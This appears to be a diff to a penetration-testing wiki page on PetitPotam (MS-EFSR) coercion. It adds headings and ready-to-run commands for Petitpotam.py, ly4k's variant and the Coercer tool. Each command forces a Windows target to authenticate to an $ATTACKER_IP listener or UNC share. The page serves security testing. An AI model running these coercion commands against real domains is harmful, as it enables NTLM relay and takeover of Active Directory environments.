@@ -25,16 +25,29 @@ crackmapexec smb <TARGET> -u <USER> -p <PASSWORD> -M petitpotam -o PIPE=netlogon
 {% endtab %}
 
 {% tab title="Exploit" %}
+#### Topotam's exploit
+
 An authentication can be forced with the original author's proof-of-concepts dubbed "[PetitPotam](https://github.com/topotam/PetitPotam)" (available in C and Python) by using a valid AD account's credentials.
 
 ```bash
 Petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
 ```
 
+#### ly4k's exploit
+
 An alternative Python implementation ([https://github.com/ly4k/PetitPotam](https://github.com/ly4k/PetitPotam)) can be used to exploit other unpatched methods that the original implementation doesn't feature.
 
 ```bash
-petitpotam.py -method AddUsersToFile -pipe netlogon $TARGET_IP '\\$ATTACKER_IP\share\foo'
+# With $TARGET as [[domain/]username[:password]@]<targetName or address>
+petitpotam.py -method AddUsersToFile -pipe netlogon $TARGET '\\$ATTACKER_IP\share\foo'
+```
+
+#### Coercer
+
+Yet another alternative is to use the [Coercer](https://github.com/p0dalirius/Coercer/tree/master) tool (python) as follow.
+
+```bash
+coercer coerce -u $USER -p $PASSWORD -d $DOMAIN --filter-protocol-name MS-EFSR -l $ATTACKER_IP -t $TARGET_IP
 ```
 {% endtab %}
 {% endtabs %}
